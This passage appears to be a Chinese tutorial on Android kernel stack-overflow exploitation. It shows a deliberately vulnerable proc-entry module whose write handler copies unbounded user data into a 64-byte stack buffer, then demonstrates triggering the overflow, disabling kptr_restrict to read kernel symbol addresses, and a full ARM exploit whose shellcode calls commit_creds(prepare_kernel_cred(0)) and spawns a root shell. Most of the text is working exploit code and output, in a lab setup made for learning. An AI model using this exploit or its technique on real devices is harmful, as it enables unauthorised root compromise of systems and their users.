    static struct proc_dir_entry *stack_buffer_proc_entry;
    int proc_entry_write(struct file *file, const char __user *ubuf, unsigned long count, void *data)
    {
        char buf[MAX_LENGTH];
        if (copy_from_user(&buf, ubuf, count)) {
            printk(KERN_INFO "stackBufferProcEntry: error copying data from userspacen");
            return -EFAULT;
        }
        return count;
    }
    static int __init stack_buffer_proc_init(void)
    {
        stack_buffer_proc_entry = create_proc_entry("stack_buffer_overflow", 0666, NULL);
        stack_buffer_proc_entry->write_proc = proc_entry_write;
        printk(KERN_INFO "created /proc/stack_buffer_overflown");
        return 0;
    }
    static void __exit stack_buffer_proc_exit(void)
    {
        if (stack_buffer_proc_entry) {
            remove_proc_entry("stack_buffer_overflow", stack_buffer_proc_entry);
        }
        printk(KERN_INFO "vuln_stack_proc_entry removedn");
    }
    module_init(stack_buffer_proc_init);
    module_exit(stack_buffer_proc_exit);
上述代码会创建/proc/stack_buffer_overflow 设备文件 ，当向该设备文件调用 write 系统调用时会调用
proc_entry_write 函数进行处理。漏洞显而易见，在 proc_entry_write 函数中 定义了一个 64 字节大小的栈缓冲区 buf，
然后使用 copy_from_user(&buf, ubuf, count) 从用户空间 拷贝数据到 buf
,数据大小和内容均用户可控。于是当我们输入超过64字节时我们能够覆盖其他的数据，比如返回地址等，进而劫持程序执行流到我们的 shellcode 中
进行提权。
首先我们来试试触发漏洞。先把模拟器打开，然后 adb shell 进入模拟器，使用 echo 命令向 /proc/stack_buffer_overflow
设备输入72字节的数据。
    echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >  /proc/stack_buffer_overflow
可以看到 pc 寄存器的值 为 0x41414141 成功劫持。测试时该内核没开 pxn
，所以我们可以在用户态编写shellcode让内核去执行。提取的方式很简单，内核态调用
commit_creds(prepare_kernel_cred(0)); 提升权限为 root, 然后返回 用户态 执行
execl("/system/bin/sh", "sh", NULL); 起一个 root 权限的 shell， 完成提权。下面先获取
prepare_kernel_cred 和 commit_creds 函数的地址。在 /proc/kallsyms
文件中保存着所有的内核符号的名称和它在内存中的位置。不过在最近的内核版本中，为了使利用内核漏洞变得更加困难，linux内核目前禁止一般用户获取符号。具体可以看[这里](http://lwn.net/Articles/420403/)。
当启用 kptr_restrict 是我们不能获取内核符号地址的。
    root@generic:/ # cat /proc/kallsyms | grep commit_creds                        
    00000000 T commit_creds
在本文中，把它禁用掉，不管他。
    root@generic:/ # echo 0 > /proc/sys/kernel/kptr_restrict                       
    root@generic:/ # cat /proc/kallsyms | grep commit_creds                        
    c0039834 T commit_creds
    root@generic:/ # cat /proc/kallsyms | grep prepare_kernel_cred                 
    c0039d34 T prepare_kernel_cred
禁用掉之后，我们就可以通过 /proc/kallsyms 获取 commit_creds 和 prepare_kernel_cred的地址。
至此，提权的问题解决了，下面就是要回到用户态，在x86平台有 iret指令可以回到用户态，在arm下返回用户态就更简单了。在arm下 cpsr 寄存器的
M[4：0] 位用来表示
处理器的运行模式，具体可以看[这个](http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html)。所以我们把
cpsr 寄存器的 M[4：0] 位设置为 10000后就表示 处理器进入了用户模式。
**所以现在的利用思路是：**
1.调用 commit_creds(prepare_kernel_cred(0)) 提升权限
2.调用 mov r3, #0x40000010; MSR CPSR_c,R3; 设置 cpsr寄存器，使cpu进入用户模式
3.然后执行 execl("/system/bin/sh", "sh", NULL); 起一个 root 权限的 shell
**最后的 exp :**
****
    #include 
    #include 
    #include 
    #include 
    #include 
    #define MAX             64
    int open_file(void)
    {
            int fd = open("/proc/stack_buffer_overflow", O_RDWR);
            if (fd == -1)
                    err(1, "open");
            return fd;
    }
    void payload(void)
    {
                    printf("[+] enjoy the shelln");
                    execl("/system/bin/sh", "sh", NULL);
    }
    extern uint32_t shellCode[];
    asm
    (
    "    .textn"
    "    .align 2n"
    "    .code 32n"
    "    .globl shellCodent"
    "shellCode:nt"
    // commit_creds(prepare_kernel_cred(0));
    // -> get root
    "LDR     R3, =0xc0039d34nt"   //prepare_kernel_cred addr
    "MOV     R0, #0nt"
    "BLX     R3nt"
    "LDR     R3, =0xc0039834nt"   //commit_creds addr
    "BLX     R3nt"
    "mov r3, #0x40000010nt"
    "MSR    CPSR_c,R3nt"
    "LDR     R3, =0x879cnt"     // payload function addr
    "BLX     R3nt"
    );
    void trigger_vuln(int fd)
    {
            #define MAX_PAYLOAD (MAX + 2  * sizeof(void*) )
            char buf[MAX_PAYLOAD];
            memset(buf, 'A', sizeof(buf));
            void * pc = buf + MAX +  1 * sizeof(void*);
            printf("shellcdoe addr: %pn", shellCode);
            printf("payload:%pn", payload);
            *(void **)pc  = (void *) shellCode;   //ret addr
            /* Kaboom! */
            write(fd, buf, sizeof(buf) );
    }
    int main(void)
    {
            int fd;
            fd = open_file();
            trigger_vuln(fd);
            payload();
            close(fd);
    }
**参考链接**
[http://blog.sina.com.cn/s/blog_6ac051b2010123cz.html](http://blog.sina.com.cn/s/blog_6ac051b2010123cz.html)
[http://bobao.360.cn/learning/detail/3702.html](http://bobao.360.cn/learning/detail/3702.html)